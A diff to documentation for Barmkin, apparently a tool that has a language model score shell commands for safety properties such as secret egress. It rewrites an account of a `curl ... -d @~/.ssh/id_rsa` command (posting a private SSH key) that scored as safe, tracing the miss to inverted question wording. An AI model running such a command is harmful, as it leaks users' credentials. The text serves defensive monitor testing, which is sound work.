@@ -213,10 +213,13 @@ is present - real `request_id`, `latency_ms`, and probabilities show
 up in `demo/out/enforce-openrouter.log`'s `dynamic` block. One live
 run surfaced a real instance of Jev's documented "indirection"
 jaggedness: `curl ... -d @~/.ssh/id_rsa` (which reads and POSTs a
-private key via curl's `@file` syntax) was scored `no_secret_egress:
-0.97` (judged *safe*) - a false negative, not a Barmkin bug; this is
-exactly the kind of model weakness composition code must assume and
-never fully trust (§3.1 "jaggedness" in report.md).
+private key via curl's `@file` syntax) was scored `0.97` on the
+then-current question wording, which asked the hazard question
+("Does the command send credentials...?") while composition reads a
+high `no_secret_egress` probability as *safe*. The model answered
+correctly; Barmkin read it backwards. Both questions are now worded
+so that "yes" means safe, matching the `no_*` ids and the
+`p <= threshold` reject rule.
 
 To exercise this yourself:
 
